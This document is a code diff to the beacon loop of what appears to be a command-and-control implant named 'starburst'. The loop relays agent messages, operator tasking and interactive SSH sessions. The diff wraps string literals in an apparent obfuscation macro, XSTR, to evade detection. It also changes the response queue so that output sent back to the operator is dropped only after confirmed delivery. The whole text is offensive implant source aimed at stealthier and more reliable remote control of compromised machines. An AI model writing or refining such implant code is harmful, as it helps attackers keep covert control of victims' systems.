@@ -494,7 +494,7 @@ auto declfn instance::beacon_loop() -> void {
                         if ( dpkg ) {
                             starburst::package_add_byte( *this, dpkg, ACTION_LINK_MSG );
                             starburst::package_add_string( *this, dpkg, cur->agent_id ?
-                                cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
+                                cur->agent_id : XSTR( "" ) );
                             starburst::package_add_bytes( *this, dpkg, msg_buf, msg_size );
 
                             uint32_t dlen = 0;
@@ -587,7 +587,7 @@ auto declfn instance::beacon_loop() -> void {
 
                 // complete the task
                 starburst::queue_response( *this, isess.task_uuid, RESPONSE_SUCCESS,
-                    symbol<char*>( const_cast<char*>( "session closed" ) ) );
+                    XSTR( "session closed" ) );
                 isess.active = false;
                 continue;
             }
@@ -638,6 +638,8 @@ auto declfn instance::beacon_loop() -> void {
         starburst::package_add_byte( *this, pkg, ACTION_GET_TASKING );
 
         // attach queued responses, capped to MAX_SEND_SIZE per cycle
+        // queue drain is deferred until transport_send confirms delivery
+        uint32_t sent_response_len = 0;
         if ( response_queue.length > 0 ) {
             uint32_t send_len = response_queue.length;
             if ( send_len > MAX_SEND_SIZE ) {
@@ -658,13 +660,7 @@ auto declfn instance::beacon_loop() -> void {
             }
 
             starburst::package_add_bytes( *this, pkg, response_queue.buffer, send_len );
-
-            // shift remaining data to front
-            uint32_t remaining = response_queue.length - send_len;
-            if ( remaining > 0 ) {
-                memory::copy( response_queue.buffer, response_queue.buffer + send_len, remaining );
-            }
-            response_queue.length = remaining;
+            sent_response_len = send_len;
         } else {
             starburst::package_add_int32( *this, pkg, 0 );
         }
@@ -721,6 +717,15 @@ auto declfn instance::beacon_loop() -> void {
         bool ok = starburst::transport_send( *this, data, data_len, &response, &resp_len );
 
         starburst::package_destroy( *this, pkg );
+
+        // drain response queue only after confirmed delivery
+        if ( ok && sent_response_len > 0 ) {
+            uint32_t remaining = response_queue.length - sent_response_len;
+            if ( remaining > 0 ) {
+                memory::copy( response_queue.buffer, response_queue.buffer + sent_response_len, remaining );
+            }
+            response_queue.length = remaining;
+        }
 
         if ( ok && response && resp_len > 0 ) {
             Parser rsp;
@@ -891,7 +896,7 @@ auto declfn instance::beacon_loop() -> void {
                                     // user closed terminal - disconnect SSH
                                     starburst::ssh_disconnect( *this, isess.ssh_session_idx );
                                     starburst::queue_response( *this, isess.task_uuid, RESPONSE_SUCCESS,
-                                        symbol<char*>( const_cast<char*>( "session closed" ) ) );
+                                        XSTR( "session closed" ) );
                                     isess.active = false;
                                 } else if ( imsg_type == INTERACTIVE_INPUT && idata_len > 0 ) {
                                     starburst::ssh_channel_write( *this, isess.ssh_session_idx,
